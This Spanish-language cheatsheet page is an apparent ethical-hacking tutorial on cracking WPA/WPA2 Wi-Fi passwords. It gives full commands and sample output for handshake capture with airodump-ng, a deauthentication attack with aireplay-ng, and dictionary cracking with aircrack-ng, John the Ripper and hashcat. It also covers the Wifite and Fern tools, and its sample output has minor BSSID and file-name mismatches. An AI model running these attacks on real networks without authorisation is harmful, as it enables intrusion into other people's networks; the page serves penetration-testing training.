
# WPA/WPA2 Cracking

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Características</mark>

* Ambos se crackean de la misma forma&#x20;
* Fueron creados con el objetivo de solucionar los errores WEP
* Son mucho más seguros
* Cada paquete es encriptado usando una llave temporal

## <mark style="color:purple;">Capturar el Handshake</mark>

El handshake es una negociación entre cliente y router para establecer la conexión.&#x20;

Al capturar el handshake, no capturamos la clave, sino que capturamos una serie de parámetros, entre ellos <mark style="color:purple;">la clave cifrada</mark>.

```bash
sudo airodump-ng wlan0

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 7E:DD:73:1B:EB:69  -76        1        0    0   6  130   WPA2 CCMP   PSK  z28 XR 
 D8:E8:44:B3:AE:10  -75       65        0    0   8  324   WPA2 CCMP   PSK  Slytherin 
 EA:66:AB:4C:31:AA  -53     4709      660    0  13  720   WPA2 CCMP   PSK  INHACKEABLE 
```

Vamos a capturar el handshake de INHACKEABLE

```bash
sudo airodump-ng --bssid EA:66:AB:4C:31:EA --channel 13 --write handshake wlan0

17:59:13  Created capture file "handshake-01.cap".

 CH 13 ][ Elapsed: 24 s ][ 2023-11-02 17:59 ][ paused output

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 EA:66:AB:4C:31:AA  -53  86      226        7    0  13  720   WPA2 CCMP   PSK  INHACKEABLE                                                                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 EA:66:AB:4C:31:EA  CE:C1:C0:DB:DF:1F  -31    0 -24      1       21                                                                                                        
 EA:66:AB:4C:31:EA  28:F0:76:4F:4E:3C  -41    0 -24e     1        8
```

Aquí podemos esperar a que alguien se conecte a la red o hacer un deauth de un dispositivo conectado. Vamos a echar a un dispositivo activo.

### Ataque Deauth

{% hint style="warning" %}
**Importante:** solo mandar como **máximo 10 paquetes**, ya que sino se podría volver a conectar a otra red que tenga vinculada. Se debe reconectar `a la misma red` para capturar el handshake.
{% endhint %}

```bash
sudo aireplay-ng --deauth 10 -a EA:66:AB:4C:31:AA -c CE:C1:C0:DB:DF:1F wlan0

18:02:41  Waiting for beacon frame (BSSID: EA:66:AB:4C:31:EA) on channel 13
18:02:41  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|57 ACKs]
```

Ya tenemos nuestro archivo `.cap`

```bash
ls -la

-rw-r--r--  1 root root 2,5M nov  2 18:04 handshake-01.cap
                                         |----------------|
-rw-r--r--  1 root root  586 nov  2 18:04 handshake-01.csv
-rw-r--r--  1 root root  606 nov  2 18:04 handshake-01.kismet.csv
-rw-r--r--  1 root root 3,8K nov  2 18:04 handshake-01.kismet.netxml
-rw-r--r--  1 root root 1,4M nov  2 18:04 handshake-01.log.csv
```

### Crackeo de handshake con diccionario

Vamos a crear un archivo de prueba que contenga el password de la red. También podríamos utilizar distintos diccionarios como las [SecList](https://github.com/danielmiessler/SecLists) o Rockyou, o crear nuestro propio diccionario con crunch por ejemplo.

{% content-ref url="/pages/pmdktnDe2dem7TOabJmf" %}
[Diccionarios Custom](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/diccionarios-custom.md)
{% endcontent-ref %}

```bash
nano pass.txt

1234
12345t
4567
34567
34567
09876
654
7654
223456
87654
4567
2343456
1nh4k34bl3!
```

```bash
# Con rockyou
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt *.cap 

# Diccionario de contraseñas default en routers
sudo aircrack-ng -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt *.cap

# Con pass.txt
sudo aircrack-ng -w pass.txt handshake-01.cap 
```

```
                               Aircrack-ng 1.7 Opening replay_arp-1102-153807.cap

      [00:00:00] 13/13 keys tested (51.17 k/s) 

      Time left: --

                          KEY FOUND! [ 1nh4k34bl3! ]


      Master Key     : 06 93 98 1B AD 97 81 FC 21 AB 47 48 FC 8D F8 DC 
                       5D B7 6A 67 4D 77 99 B7 E7 37 CD 0F C3 87 8B B6 

      Transient Key  : E3 3A 70 9C EB 84 C1 01 20 B2 9F 88 5B 9B 2E 7B 
                       85 51 7A 3D 77 01 14 29 69 20 25 FD 2F AA 09 70 
                       AA 60 EF CB C4 49 65 BC 8C 28 78 67 86 AB FF E0 
                       64 58 FB F4 E2 25 32 18 87 04 A8 AB CF F6 75 8E 

      EAPOL HMAC     : 9E 4D D1 15 DB 7B A3 DF 8D BE 81 46 65 FA 75 B1 
```

### Guardar proceso de cracking

No podemos detener aircrack-ng, por lo que usaremos John the Ripper:

{% code overflow="wrap" %}

```bash
john --wordlist=wordlist.txt -stdout --session=wpa2 | aircrack-ng -w - -b <MAC-TARGET> handshake.cap
```

{% endcode %}

* Si detenemos el programa con CTRL+C se guardará el proceso
* Nos guarda el archivo `wpa2.rec` que vamos a usar para recuperar la sesión

```bash
john --restore=wpa2 | aircrack-ng -w - -b <MAC-TARGET> handshake.cap
```

### Usar GPU para acelerar el cracking

Podemos usar hashcat para acelerar el proceso de cracking utilizando la GPU:

```bash
hashcat -m 22000 -d 1 handshake.hc22000 wordlist
```

## <mark style="color:purple;">Wifite</mark>

Su objetivo principal es automatizar y simplificar el proceso de obtención de claves de seguridad en redes Wi-Fi. Wifite está desarrollada en Python y es compatible con sistemas operativos basados en Linux, como Kali Linux.

{% embed url="<https://github.com/derv82/wifite>" %}

#### Nueva versión

{% embed url="<https://github.com/derv82/wifite2>" %}

#### Instalación

```bash
git clone https://github.com/derv82/wifite2.git
cd wifite2
sudo ./Wifite.py

# Instalación global
sudo python setup.py install
```

<figure><img src="/files/kF9hpQNNdOtv5eqcmkGX" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Fern Wifi Cracker</mark>

Es un programa con GUI incluido por defecto en Kali Linux que automatiza el proceso de cracking wifi, introduciendo un diccionario.

#### Versión PRO

{% embed url="<http://www.fern-pro.com/>" %}

```bash
sudo ip link set wlan0 down
sudo ip link set wlan0 name wlan0mon
sudo airmon-ng start wlan0mon
```

A partir de ejecutar los anteriores comandos ya podemos ejecutar la herramienta, si el adaptador no tiene el nombre wlan0mon fallará el programa.

<figure><img src="/files/QFndTv00eMZ6IuuEh9LG" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/EJIaoX10EFUU2nH8IHPS" alt=""><figcaption></figcaption></figure>
